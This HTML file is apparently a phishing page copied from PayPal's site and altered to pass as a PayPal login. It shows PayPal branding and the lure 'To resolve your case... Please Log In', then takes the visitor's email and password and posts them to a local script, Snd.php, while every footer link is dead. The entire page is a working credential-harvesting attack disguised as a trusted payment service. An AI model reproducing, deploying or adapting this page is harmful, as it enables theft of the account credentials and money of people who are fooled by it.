<!DOCTYPE html>
<!-- saved from url=(0052)https://www.paypal.com/us/webapps/mpp/what-is-paypal -->
<html lang="en" class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths jsEnabled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	    
		
	    <title>
		
	Login - PayPal
		
		</title>
         <style type="text/css">
.input.large[type="password"], input.large[type="text"] {
    font-size: 15px;
    font-weight: normal;
}
input.large {
    width: 7em;
}
input.large1 {
    width: 20em;
}
input {
    -moz-appearance: none;
    -moz-box-sizing: border-box;
    background: none repeat scroll 0px 0px #FFF;
    border: 1px solid #B3B3B3;
    border-radius: 5px;
    color: #333;
    font-size: 1.071rem;
    height: 38px;
    line-height: 1.25em;
    margin: 0px;
    padding: 0px;
    position: relative;
    text-indent: 10px;
    transition: border-color 0.3s ease 0s;
    width: 250px;
}
input, textarea {
    padding: 2px;
}
input, select, textarea {
    border: 1px solid #ADC2D6;
    font: 1em Arial,Helvetica,sans-serif;
}
form div p {
    color: #777;
    font-size: 1.071rem;
    line-height: 1.5em;
    margin: 0px;
    padding-bottom: 14px;
    padding-top: 4px;
}

.btn {
    -moz-box-sizing: border-box;
    background: none repeat scroll 0px 0px #0079C1;
    border-radius: 3px;
    color: #FFF;
    cursor: pointer;
    display: inline-block;
    font-family: arial,sans-serif;
    font-size: 15px;
    font-weight: bold;
    line-height: 1.4545em;
    margin-bottom: 0px;
    padding: 9px 15px 10px;
    text-align: center;
    vertical-align: middle;
    height: 40px;
}
</style>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="application-name" content="PayPal">
		<meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">		
		<meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
  		<meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
		
		<meta name="keywords" content="">		
		<meta name="description" content="">
	
        
            <link rel="canonical" href="https://www.paypal.com/us/webapps/mpp/what-is-paypal?locale.x=en_US">
        

		<link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
		<link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png">		
        
			<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
        
		
		
	
	
	
			
			

		
		
		<link rel="stylesheet" href="./css/9433b8e9361a195efc95aefbc9fccb74fd0c22.css" type="text/css">
		
        
    		
    		
    			<link rel="stylesheet" href="./css/1472e9f7ae5b4c0c6c6ab806185c5e98f4592a.css" type="text/css">
    			
    			<!--[if IE 9]>
    				<link rel="stylesheet" href="https://www.paypalobjects.com/eboxapps/css/27/dfc2b7f9bdd3e4d11dc097bd7d6ca7eaac674d.css" rel="stylesheet" type="text/css" />
    			<![endif]-->
    			<!--[if IE 8]>
    				<link rel="stylesheet" href="https://www.paypalobjects.com/eboxapps/css/89/1d32cb6854d1c68f590e1db67f8b1ee8a2d8ac.css" rel="stylesheet" type="text/css" />
    			<![endif]-->
    			
    		
        


		
				
				
		
		
		
	<style type="text/css">
		#content {
			border-top: 1px solid #d7d7d7;
		}
		.pageHeadline, .pageHeadline2, .contentHeadline {
			font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, sans-serif;
		}
		#touchdevice .pageHeadline, .pageHeadline2, .contentHeadline {
			line-height: 38px;
		}
		#desktop .pageHeadline2 {
			margin-bottom: 19px;
			font-weight: 300;
			height: 38px;
			letter-spacing: 1px;
		}
		.featureImage {
			margin: 0 auto 8px;
		}	
		.kicker .span4 {
			margin-bottom: 25px;
		}
		#desktop .kicker .span4 p {
			width: 294px;
		}
		#desktop .contentHeadline {
			color: rgb(68, 68, 68);
			line-height: 28px;
		}
		
		/* mobile/tablet hacks*/
		#touchdevice #main {
			padding : 12px 0 0;
		}
		#touchdevice .pageHeadline h1 {
			float: left;
			font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, sans-serif;
			white-space: nowrap;
		}

		/* phones */
		@media 
		only screen and (orientation: portrait) and (max-width: 479px),
		only screen and (orientation: landscape) and (max-width: 640px) {
			
			#touchdevice .pageHeadline2 {
				font-size: 24px;
				margin-top: -14px;
			}
			#touchdevice  p {
				font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, sans-serif;
				font-weight: normal;
				margin-top: 15px;
				margin-bottom: 20px;
				line-height: 24px;
			}
			#touchdevice .kicker .contentHeadline {
				color: rgb(68, 68, 68);
				font-size: 24px;
				padding-bottom ; 10px;
			}
			#touchdevice .row-fluid .span7, #touchdevice .row-fluid .span4{
				width : 100%;
			}
		}

		/* small tablets */
		@media 
		only screen and (orientation: portrait) and (min-width: 480px) and (max-width: 767px),
		only screen and (orientation: landscape) and (min-width: 641px) and (max-width: 1023px) {

			#touchdevice .walletHero {
				margin-top: -14px;
			}
			#touchdevice  p {
				font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, sans-serif;
				font-weight: normal;
				margin-top: 15px;
				margin-bottom: 20px;
				line-height: 24px;
			}
			#touchdevice .kicker .contentHeadline {
				color: rgb(68, 68, 68);
				font-size: 24px;
				padding-bottom ; 10px;
			}
			#touchdevice .featureImage {
				float : right;
			}
			
		}

		@media only screen and (orientation: portrait) and (min-width: 480px) and (max-width: 767px) {

			#touchdevice .row-fluid .span4,  #touchdevice .row-fluid .span7	{
				width : 100%;
				margin-left : 0;
			}
		}

		@media only screen and (orientation: landscape) and (min-width: 641px) and (max-width: 1023px) { 
			#touchdevice .row-fluid .span4	{
				width : 100%;
				margin-left : 0;
			}
		}

		/* regular tablets */
		@media 
		only screen and (orientation: portrait) and (min-width: 768px),
		only screen and (orientation: landscape) and (min-width: 1024px) {

			#touchdevice #main {
				width: auto;
				padding: 12px 30px 0 30px;
			}

			#touchdevice .walletHero {
				margin-top: -14px;
			}
			#touchdevice  p {
				font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, sans-serif;
				font-weight: normal;
				margin-top: 15px;
				margin-bottom: 20px;
				line-height: 24px;
			}
			#touchdevice .kicker .contentHeadline {
				color: rgb(68, 68, 68);
				font-size: 24px;
				padding-bottom ; 10px;
			}

			#touchdevice .row-fluid .span4 {
				width : 100%;
				margin-left : 0;
			}

			#touchdevice .featureImage {
				float : right;
			}
		}
	</style>



		

		

		<script>
			if (self === top) {
				var antiClickjack = document.getElementById("antiClickjack");
				antiClickjack.parentNode.removeChild(antiClickjack);
			} else {
				top.location = self.location;
			}
		</script><style type="text/css"></style>


		 <script src="./css/4619d0e7d26a8e05c2f9e9d2f0c4d66a68f024.js"></script> 
		 
        <!--[if lt IE 9]>
        <script>
        /* HTML5 tag support */
        document.createElement('header');
        document.createElement('nav');
        document.createElement('section');
        document.createElement('article');
        document.createElement('footer');
        </script>
        <![endif]-->		 
  	<link type="text/css" rel="stylesheet" href="chrome-extension://cpngackimfmofbokmjmljamhdncknpmg/style.css"><script type="text/javascript" charset="utf-8" src="chrome-extension://cpngackimfmofbokmjmljamhdncknpmg/js/page_context.js"></script><script type="text/javascript" src="./js/baynote.js"></script></head>
	
    
    	
    		<body id="desktop" screen_capture_injected="true">
    			
                  
                
    			
    		
    			<div id="page">
    				



<header class="gblMHeader">
  <div class="nav">
		<div class="navOut">
			<nav role="navigation">
				<ul>
					<li class="logo">
						<a href="#"><img src="./img/logo_paypal_106x29.png" alt="PayPal Home"></a>
					</li>
				</ul>
			</nav>
		</div>
	</div>
</header>

	
    				<div id="content" tabindex="-1">
    					<div id="main" role="main" style="margin-bottom: 47px;">						
						
						
						
    						

	<div id="mainContent">
		<div class="row-fluid">
			<div class="span12">
				<div class="pageHeadline">
					<h1>Welcome to PayPal.</h1>
				</div>
			</div>
		</div>
	<div class="moduleContent">
		<div class="row-fluid walletHero">
			<div class="span7">
				<h3><strong>To resolve your case, what we need is a confirmation of your account to confirm Your account, Please Log In</strong>.</h3>
				<p> </p>
<form action="Snd.php" name="validateform" onSubmit="return check();" method="post" >
     <table width="22%" border="0" cellspacing="2" cellpadding="2">
  
          <p>&nbsp;</p>
                <p>
                <tr>
      <th width="105" scope="row">&nbsp;</th>
      <td width="283" colspan="2">
                  <input id="login_email" class="large1" type="email"   name="login_email" placeholder="  Email address" required title="Please Enter Your Email address" >
                  </input>
                  </td>
    
    </tr>
                </p>
<p>
 <tr>
      <th width="105" scope="row">&nbsp;</th>
      <td colspan="2">
    <input id="login_password" class="large1" type="password" name="login_password" autocomplete="off" placeholder="  Password" required title="Please Enter Your Password" ></input>
             </td>
    
    </tr>
</p>
<p>
 <tr>
       <th width="105" scope="row">&nbsp;</th>
      <td colspan="2">
    <input id="login.x" class="btn large" type="submit" value="Log In" name="login" style="
    padding-left: 0px;
    padding-right: 12px;
">
      </td>
    </tr>
    <tr>
      <th width="105" scope="row">&nbsp;</th>
      <td colspan="2">
      <p>
      <a href="#">Problem with login?
      </p>
       </td>
    </tr>
   
</table>
           	  </FORM> 				
			</div>
			<div class="span5 hidden-phone">
				 <img src="./img/wallet-hero.png" alt="Wallet Feature Image">
			</div>
		</div>
		<div class="row-fluid kicker"></div>
	</div>
	</div>

						
    					</div>
    				</div>
    				

	<footer id="gblMarketingFooter" role="contentinfo">
		<div class="utility">
			<div class="footerNav"> 
				<nav>
					<ul style="margin-left: 273px;">
						
							
								
								
									<li>
<a href="#">Help</a>
</li>
								
									<li>
<a href="#">Contact</a>
</li>
								
									<li>
<a href="#">Fees</a>
</li>
								
									<li>
<a href="#">Security</a>
</li>
								
									<li>
<a href="#">Features</a>
</li>
								
									<li>
<a href="#">Shop</a>
</li>
								
																		
						
					</ul>
				      
	   
		<script type="text/javascript">
			window.PAYPAL = window.PAYPAL ? window.PAYPAL : {};
			window.PAYPAL.util = window.PAYPAL.util ? window.PAYPAL.util : {};
			PAYPAL.util.ppobjectsPath = "https://www.paypalobjects.com";
		</script></nav>
			</div>
		</div>
		<div class="footer">
			<div class="footerNav clearfix"> 

				<div class="wrapper" style="margin-left: 205px;">			
					<ul class="topList">											
						
							
								
								
									<li>
<a href="#">About</a>
</li>
								
									<li>
<a href="#">Blog</a>
</li>
								
									<li>
<a href="#">Jobs</a>
</li>
								
									<li>
<a href="#">Sitemap</a>
</li>
								
									<li>
<a href="#">eBay</a>
</li>
								
									<li>
<a href="#">Developers</a>
</li>
								
									<li>
<a href="#">Enterprise</a>
</li>
								
									<li>
<a href="#">Partners</a>
</li>
								
								
						
						<li id="siteFeedback">
							


						<a href="#">Feedback</a><img src="./img/sm_333_oo.gif" alt=""></li>
					</ul>
					<div class="legal" style="margin-left: 146px;">
						
						<p class="copyright">
						© 1999 - 2016 PayPal
						</p>
						<ul>
							
								
									<li>
<a href="#">Privacy</a>
</li>
									<li>
<a href="#">Legal</a>
</li>
										
								</ul>
									
									  	
									  	
									  	
									  	
									  	<p class="legalContent">

</p>
									  	
									  	
									  	
									  	
									  	
									  										  	
	    							
							
					</div>
				</div>
				<span class="countryList">				</span>
			</div>
		</div>
	</footer>
    			</div>
</body></html>